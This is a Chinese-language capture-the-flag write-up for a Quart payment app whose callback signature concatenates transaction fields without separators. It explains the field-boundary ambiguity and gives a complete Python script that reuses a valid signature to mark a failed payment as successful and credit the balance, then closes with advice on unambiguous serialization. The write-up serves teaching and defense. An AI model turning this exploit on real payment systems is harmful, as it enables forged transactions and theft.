# 支付系统

## 题目简述

题目是一个 Quart 支付应用。用户通过签名 session 标识，但每次请求都会把 `balance` 清零，再从数据库中所有状态为 `SUCCESS` 的交易重新计算余额。因此，直接修改客户端 session 即使成功，也不能持久改变余额。

支付后台会把交易的 5 个字段直接转成字符串并无分隔拼接，再使用随机 `app.secret_key` 计算 PBKDF2-HMAC-SHA256：

```python
data = (
    f"{transaction.id}"
    f"{transaction.user}"
    f"{transaction.amount}"
    f"{transaction.status}"
    f"{transaction.desc}"
).encode()

signature = pbkdf2_hmac(
    "sha256",
    data,
    app.secret_key,
    2**20,
).hex()
```

问题不在 PBKDF2 的迭代次数，也不需要恢复 `secret_key`。真正的漏洞是签名前的序列化没有分隔符、长度或类型标签：不同字段组合可以产生完全相同的字节串，从而重用合法签名。

## 解题过程

`/pay` 创建交易后，后台任务会把状态改为 `FAILED=2`，再为交易字段签名并请求 `/callback`。设交易的 `id` 和 `user` 保持不变，创建一笔

```text
amount = 2000
status = 2
desc   = ""
```

的交易，待签名字节串的可变部分为

```text
"2000" + "2" + "" = "20002"
```

随后向 `/callback` 发送另一组字段：

```text
amount = 200
status = 0
desc   = "2"
```

它们的拼接结果仍然是

```text
"200" + "0" + "2" = "20002"
```

所以完整的 `id || user || amount || status || desc` 与原交易完全相同，可以直接复用收据中的 `hash`。服务端验签后却按字段分别解析数据：`status=0` 被转换成 `SUCCESS`，`amount=200` 写回交易，`desc` 变为 `"2"`。下一次请求重新统计成功交易时，账户余额就会增加 200。

`/pay` 使用后台任务异步回调，因此脚本需要等待收据中出现服务端生成的 hash，不能假设重定向后立即可读。完整利用如下，其中 `BASE_URL` 应替换为当前靶机地址：

```python
import re
import time
from urllib.parse import parse_qs, urljoin, urlparse

import requests


BASE_URL = "http://target"
HASH_RE = re.compile(r"\b[0-9a-f]{64}\b")
UUID_RE = re.compile(
    r"\b[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}\b"
)

session = requests.Session()

# 后台回调会把这笔交易标记为 FAILED=2，并签名后缀 "20002"。
response = session.get(
    f"{BASE_URL}/pay",
    params={"amount": "2000", "desc": ""},
    allow_redirects=False,
)
response.raise_for_status()

receipt_url = urljoin(BASE_URL, response.headers["Location"])
transaction_id = parse_qs(
    urlparse(receipt_url).query
)["id"][0]

# 等待异步 callback 完成，收据中才会出现 user 与 hash。
for _ in range(50):
    receipt = session.get(receipt_url)
    receipt.raise_for_status()

    hash_match = HASH_RE.search(receipt.text)
    user_match = UUID_RE.search(receipt.text)
    if hash_match and user_match:
        signature = hash_match.group(0)
        user = user_match.group(0)
        break
    time.sleep(0.1)
else:
    raise RuntimeError("receipt did not expose a completed callback")

# "200" + "0" + "2" 与原来的 "2000" + "2" + "" 相同。
callback = session.post(
    f"{BASE_URL}/callback",
    data={
        "id": transaction_id,
        "user": user,
        "amount": "200",
        "status": "0",
        "desc": "2",
        "hash": signature,
    },
)
callback.raise_for_status()
assert callback.text == "ok"

flag_page = session.get(f"{BASE_URL}/flag")
flag_page.raise_for_status()
print(flag_page.text)
```

这里复用的是同一条消息的合法签名，并未制造哈希碰撞。即使把 PBKDF2 迭代次数继续提高，或把它替换为标准 HMAC，只要字段仍采用这种有歧义的串联方式，漏洞仍然存在。

## 方法总结

对任何“多字段拼接后签名”的协议，都应先写出验签前的确切字节串，再检查字段边界是否唯一。安全做法是使用无歧义的规范序列化，例如固定宽度、长度前缀或带类型的规范 JSON，并在服务端从数据库读取不可变交易字段后自行重建消息。验签通过后也不应把回调表单中的任意字段直接写回原交易，否则签名覆盖的字节语义与业务层解析语义一旦不一致，就会出现本题这种签名重用。
